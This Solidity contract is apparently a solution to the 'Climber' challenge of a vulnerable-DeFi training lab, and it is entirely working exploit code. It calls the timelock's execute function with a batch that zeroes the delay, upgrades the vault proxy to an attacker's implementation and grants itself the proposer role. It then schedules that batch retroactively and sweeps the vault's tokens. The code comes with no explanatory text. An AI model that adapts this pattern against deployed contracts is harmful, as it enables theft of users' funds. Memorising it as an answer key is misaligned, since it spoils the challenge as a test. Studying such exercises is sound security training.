// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./ClimberVault.sol";
import "./ClimberVaultV2.sol";

import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

contract ClimberVaultExp {
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt = keccak256("salt");

    ClimberTimelock timeLock;
    ClimberVault vault;
    address token;

    constructor(
        ClimberTimelock _timeLock,
        ClimberVault _vault,
        address _token
    ) {
        timeLock = _timeLock;
        vault = _vault;
        token = _token;
    }

    function exp() public {
        // update delay
        targets.push(address(timeLock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
        // upgrade vault
        ClimberVaultV2 v2 = new ClimberVaultV2();
        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("upgradeTo(address)", address(v2))
        );
        // set proposer to this
        targets.push(address(timeLock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1,
                address(this)
            )
        );
        // schedule execution
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("schedule()"));

        timeLock.execute(targets, values, dataElements, salt);
    }

    function schedule() public {
        timeLock.schedule(targets, values, dataElements, salt);
        vault.sweepFunds(token);
    }
}
